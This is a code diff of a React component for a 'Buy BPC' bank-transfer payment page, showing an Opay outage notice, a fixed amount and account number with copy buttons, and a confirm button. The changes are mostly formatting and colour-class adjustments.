@@ -1,58 +1,43 @@
-
 import React, { useEffect, useState } from "react";
 import { useNavigate } from "react-router-dom";
 import { ArrowLeft, Copy } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { toast } from "@/hooks/use-toast";
-
 const BuyBPCPayment = () => {
   const navigate = useNavigate();
   const [showOpayAlert, setShowOpayAlert] = useState(true);
-
   const handleCopy = (text: string, type: string) => {
     navigator.clipboard.writeText(text).then(() => {
       toast({
         description: `${type} copied to clipboard!`,
-        duration: 2000,
+        duration: 2000
       });
     });
   };
-
   const handlePaymentConfirm = () => {
     navigate("/buy-bpc/verifying");
   };
-
-  return (
-    <div className="min-h-screen flex flex-col bg-gray-100 relative">
-      {showOpayAlert && (
-        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
-          <div className="bg-white rounded-lg shadow-lg p-4 max-w-sm w-full mx-4 text-center">
-            <div className="flex flex-col items-center">
-              <img
-                src="https://i.ibb.co/qLVCfHVK/icon.jpg"
-                alt="Opay Logo"
-                className="w-10 h-10 mb-2"
-              />
+  return <div className="min-h-screen flex flex-col bg-gray-100 relative">
+      {showOpayAlert && <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+          <div className="rounded-lg shadow-lg p-4 max-w-sm w-full mx-4 text-center bg-red-950">
+            <div className="flex flex-col items-center bg-secondary">
+              <img src="https://i.ibb.co/qLVCfHVK/icon.jpg" alt="Opay Logo" className="w-10 h-10 mb-2" />
               <h2 className="text-red-600 text-lg font-bold mb-2">
                 Opay Service Down
               </h2>
-              <p className="text-gray-700 mb-2 text-sm">
+              <p className="mb-2 text-sm text-secondary-foreground">
                 Please do not use Opay bank for payments at this time.
               </p>
               <div className="bg-red-100 border border-red-400 text-red-700 px-3 py-2 rounded mb-3 text-xs">
                 The Opay bank service is currently experiencing issues. Please
                 use other supported banks for your payment.
               </div>
-              <Button
-                className="bg-blue-600 hover:bg-blue-700 w-full py-2 text-white text-sm"
-                onClick={() => setShowOpayAlert(false)}
-              >
+              <Button className="bg-blue-600 hover:bg-blue-700 w-full py-2 text-white text-sm" onClick={() => setShowOpayAlert(false)}>
                 I Understand
               </Button>
             </div>
           </div>
-        </div>
-      )}
+        </div>}
 
       <header className="bg-[#222222] text-white py-3 px-4 flex justify-between items-center sticky top-0 z-10">
         <button className="text-lg">
@@ -71,10 +56,7 @@ const BuyBPCPayment = () => {
           </button>
           <h2 className="text-lg font-bold">Bank Transfer</h2>
         </div>
-        <button
-          onClick={() => navigate(-1)}
-          className="text-red-500 font-medium text-sm"
-        >
+        <button onClick={() => navigate(-1)} className="text-red-500 font-medium text-sm">
           Cancel
         </button>
       </div>
@@ -101,12 +83,7 @@ const BuyBPCPayment = () => {
           <p className="text-gray-500 text-xs">Amount</p>
           <div className="flex justify-between items-center">
             <p className="text-lg font-bold">NGN 6,200</p>
-            <Button
-              variant="default"
-              size="sm"
-              className="bg-blue-600 hover:bg-blue-700 flex items-center gap-1"
-              onClick={() => handleCopy("6,200", "Amount")}
-            >
+            <Button variant="default" size="sm" className="bg-blue-600 hover:bg-blue-700 flex items-center gap-1" onClick={() => handleCopy("6,200", "Amount")}>
               <Copy size={14} />
               Copy
             </Button>
@@ -117,12 +94,7 @@ const BuyBPCPayment = () => {
           <p className="text-gray-500 text-xs">Account Number</p>
           <div className="flex justify-between items-center">
             <p className="text-lg font-bold">0085812875</p>
-            <Button
-              variant="default"
-              size="sm"
-              className="bg-blue-600 hover:bg-blue-700 flex items-center gap-1"
-              onClick={() => handleCopy("0085812875", "Account Number")}
-            >
+            <Button variant="default" size="sm" className="bg-blue-600 hover:bg-blue-700 flex items-center gap-1" onClick={() => handleCopy("0085812875", "Account Number")}>
               <Copy size={14} />
               Copy
             </Button>
@@ -145,15 +117,10 @@ const BuyBPCPayment = () => {
       </p>
 
       <div className="px-4 mb-6">
-        <Button
-          className="bg-blue-600 hover:bg-blue-700 w-full py-4 text-base font-semibold"
-          onClick={handlePaymentConfirm}
-        >
+        <Button className="bg-blue-600 hover:bg-blue-700 w-full py-4 text-base font-semibold" onClick={handlePaymentConfirm}>
           I have made this bank Transfer
         </Button>
       </div>
-    </div>
-  );
+    </div>;
 };
-
 export default BuyBPCPayment;
